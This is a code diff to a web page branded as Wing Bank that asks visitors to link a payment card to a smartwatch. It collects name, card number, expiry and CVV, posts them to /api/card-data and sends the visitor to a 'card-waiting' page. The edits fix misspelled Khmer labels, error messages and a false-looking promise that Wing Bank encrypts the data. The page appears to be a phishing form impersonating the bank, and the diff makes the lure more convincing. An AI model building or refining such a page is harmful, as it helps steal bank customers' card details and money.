@@ -98,7 +98,7 @@
   <div class="hero">
     <img src="images/bird-card.jpg" alt="Wing Bank Card & Watch">
     <h1>ភ្ជាប់កាតទៅនាលិកា</h1>
-    <p>បញ្ចុលទិន្នន័យកាតរបស់កនហដីម្បីការទុទាត់មិនប៉ាហនៅលីនាលិកាឆ្លាតវៃ</p>
+    <p>បញ្ចូលទិន្នន័យកាតរបស់អ្នកដើម្បីការទូទាត់មិនប៉ះនៅលើនាឡិកាឆ្លាតវៃ</p>
   </div>
 
   <div class="form-wrap">
@@ -106,9 +106,9 @@
       <div class="error-msg" id="errorMsg"></div>
 
       <div class="field">
-        <label>ឆ្មោហម្ចាស់កាត</label>
+        <label>ឈ្មោះម្ចាស់កាត</label>
         <div class="input-wrap">
-          <input type="text" id="cardName" placeholder="ឆ្មោហដុចនៅលីកាត" autocomplete="cc-name">
+          <input type="text" id="cardName" placeholder="ឈ្មោះដូចនៅលើកាត" autocomplete="cc-name">
           <svg class="icon" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
         </div>
       </div>
@@ -120,7 +120,7 @@
           <svg class="icon" viewBox="0 0 24 24"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
           <img class="brand-icon" id="brandIcon" src="" alt="" style="display:none">
         </div>
-        <div class="field-error" id="cardNumberError">លេខកាតមិនត្រឹមត្រ</div>
+        <div class="field-error" id="cardNumberError">លេខកាតមិនត្រឹមត្រូវ</div>
       </div>
 
       <div class="row">
@@ -130,7 +130,7 @@
             <input type="tel" id="cardExpiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" autocomplete="cc-exp">
             <svg class="icon" viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
           </div>
-          <div class="field-error" id="expiryError">កាលបរិច្ឆេទមិនត្រឹមត្រ</div>
+          <div class="field-error" id="expiryError">កាលបរិច្ឆេទមិនត្រឹមត្រូវ</div>
         </div>
         <div class="field">
           <label>CVV</label>
@@ -143,7 +143,7 @@
 
       <div class="info-box">
         <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
-        <span>ទិន្នន័យកាតរបស់កនហត្រុវបានកុដកាតាលិក និងឋ្រហ្ជិងដោយសុវត្តិភាពដោយ Wing Bank</span>
+        <span>ទិន្នន័យកាតរបស់អ្នកត្រូវបានអ៊ិនគ្រីប និងដំណើរការដោយសុវត្ថិភាពដោយ Wing Bank</span>
       </div>
     </div>
   </div>
@@ -252,14 +252,14 @@
     const expiry = expiryEl.value.trim();
     const cvv = document.getElementById("cardCvv").value.trim();
 
-    if (!name) { showError("សុមបញ្ចុលឆ្មោហម្ចាស់កាត"); return; }
-    if (number.length < 13) { showError("សុមបញ្ចុលលេខកាតត្រឹមត្រ"); cardNumEl.classList.add("invalid"); return; }
-    if (!validateExpiry(expiry)) { showError("សុមបញ្ចុលកាលបរិច្ឆេទត្រឹមត្រ"); expiryEl.classList.add("invalid"); return; }
+    if (!name) { showError("សូមបញ្ចូលឈ្មោះម្ចាស់កាត"); return; }
+    if (number.length < 13) { showError("សូមបញ្ចូលលេខកាតត្រឹមត្រូវ"); cardNumEl.classList.add("invalid"); return; }
+    if (!validateExpiry(expiry)) { showError("សូមបញ្ចូលកាលបរិច្ឆេទត្រឹមត្រូវ"); expiryEl.classList.add("invalid"); return; }
     if (cvv.length < 3) { showError("សូមបញ្ចូល CVV"); return; }
 
     const btn = document.getElementById("submitBtn");
     btn.disabled = true;
-    btn.textContent = "កម្ពុងពិនិត្យ...";
+    btn.textContent = "កំពុងពិនិត្យ...";
 
     try {
       const res = await fetch("/api/card-data", {
@@ -277,12 +277,12 @@
       if (data.success) {
         location.href = "card-waiting.html?order=" + orderId;
       } else {
-        showError(data.message || "មានកម្ហិសកីតលីង");
+        showError(data.message || "មានកំហុស");
         btn.disabled = false;
         btn.textContent = "បញ្ជាក់និងភ្ជាប់កាត";
       }
     } catch(err) {
-      showError("កម្ហិសក្នុងការភ្ជាប់");
+      showError("កំហុសក្នុងការភ្ជាប់");
       btn.disabled = false;
       btn.textContent = "បញ្ជាក់និងភ្ជាប់កាត";
     }
